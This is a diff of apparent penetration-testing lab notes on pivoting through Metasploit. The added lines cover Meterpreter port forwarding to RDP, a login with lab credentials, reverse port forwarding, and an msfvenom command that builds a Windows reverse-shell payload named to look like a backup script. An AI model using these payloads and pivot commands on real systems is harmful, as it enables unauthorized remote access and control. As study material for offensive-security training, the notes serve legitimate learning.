@@ -40,16 +40,32 @@ proxychains msfconsole
 
 Launch Metasploit through the proxy to route all associated traffic through the tunnel.
 
+## metasploit port forwarding
 ```
-proxychains xfreerdp /v:<target> /u:<user> /p:<password>
+meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19
 ```
 
-Connect to RDP through the pivot.
-
-Metasploit port forwarding
-
-use exploit/multi/handler
-
- msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session.
 
 ```
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+connect to the windows session through localhost
+
+## meterpreter reverse port forwarding
+```
+ portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+```
+create a reverse port forward on our existing shell from the previous scenario using the this
+command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`.
+```
+set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+```
+background the session and set the correct payload
+
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
+```
+, if we execute our payload on the Windows host, we should be able to receive a shell from Windows pivoted via the Ubuntu server.
+
